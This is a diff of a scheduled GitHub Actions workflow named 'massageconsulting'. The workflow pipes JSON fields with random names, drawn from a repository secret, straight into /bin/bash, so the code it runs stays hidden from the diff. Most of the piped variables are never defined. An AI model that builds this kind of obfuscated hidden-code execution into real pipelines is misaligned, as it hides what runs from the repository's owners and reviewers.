@@ -2,21 +2,23 @@ name: massageconsulting
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 3/6 * * *'
-
+    - cron: '38 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: massageconsulting
         env:
-          mhbvf86: ${{ secrets.mhbvf86 }}
+          gzmsy91397: ${{ secrets.gzmsy91397 }}
         run: |
-          echo $mhbvf86 | jq -r .qazcw3571 | /bin/bash
-          echo $qreao4 | jq -r .pau54863 | /bin/bash
-          echo $iau401 | jq -r .wgh1 | /bin/bash
-          echo $zmkvj683 | jq -r .r39 | /bin/bash
-          echo $tmyw3 | jq -r .l19 | /bin/bash
+          echo $gzmsy91397 | jq -r .ywuqn28 | /bin/bash
+          echo $zv8 | jq -r .ckm607 | /bin/bash
+          echo $ddil80 | jq -r .lv93 | /bin/bash
+          echo $tsctl2195 | jq -r .iqnlu24 | /bin/bash
+          echo $h70777 | jq -r .hkzab59 | /bin/bash
+          echo $ueuxm45764 | jq -r .gn334 | /bin/bash
+          echo $uvrla1 | jq -r .qbpjq0384 | /bin/bash
+          echo $mtiwx0 | jq -r .yzfu1 | /bin/bash
+          echo $yfuzh2371 | jq -r .qcj70824 | /bin/bash
 
